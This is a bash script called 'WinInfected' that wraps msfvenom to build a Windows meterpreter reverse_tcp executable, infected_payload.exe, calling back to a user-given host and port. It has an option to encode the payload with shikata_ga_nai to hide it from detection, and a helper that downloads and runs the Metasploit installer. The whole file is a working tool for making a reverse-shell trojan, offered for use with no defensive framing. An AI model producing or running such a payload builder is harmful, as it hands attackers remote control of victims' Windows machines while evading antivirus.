#!/bin/bash

VERSION="1.2"
COMMAND=$(basename "$0")

show_help() {
  echo "WinInfected v$VERSION"
  echo "Usage: sudo $COMMAND [LHOST] [LPORT] [--obfuscate]"
  echo
  echo "Example: sudo $COMMAND 192.168.1.1 4444 --obfuscate"
  echo "Options:"
  echo "  --dependencies   Check and install missing dependencies."
  echo "  --update         Update script and dependencies."
  echo "  --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder."
  echo "  -h, --help       Display this help message."
  echo
  echo "More information: https://github.com/byfranke/wininfected"
  exit 1
}

install_dependencies() {
  echo "Checking and installing dependencies..."
  if ! command -v msfvenom &> /dev/null; then
    echo "Metasploit not found. Installing..."
    apt update && apt install -y curl gnupg2
    curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
    chmod +x msfinstall
    ./msfinstall
    rm msfinstall
  else
    echo "Metasploit already installed."
  fi
}

update_script() {
  echo "Updating Metasploit Framework..."
  apt update && apt upgrade -y metasploit-framework
  echo "Script and dependencies updated successfully."
}

generate_payload() {
  local LHOST="$1"
  local LPORT="$2"
  local PAYLOAD="windows/meterpreter/reverse_tcp"
  local ENCODER=""

  if [[ "$3" == "--obfuscate" ]]; then
    ENCODER="-e x86/shikata_ga_nai -i 3"
  fi

  if ! command -v msfvenom &> /dev/null; then
    echo "Error: msfvenom not found. Run with --dependencies to install."
    exit 1
  fi

  echo "[*] Generating payload..."
  msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT $ENCODER -f exe -o infected_payload.exe
  echo "[+] Payload generated as infected_payload.exe"
}

case "$1" in
  --dependencies) install_dependencies ;;
  --update) update_script ;;
  -h|--help) show_help ;;
  *) 
    if [[ $# -lt 2 ]]; then
      echo "Error: Missing arguments."
      show_help
    else
      generate_payload "$1" "$2" "$3"
    fi
    ;;
esac
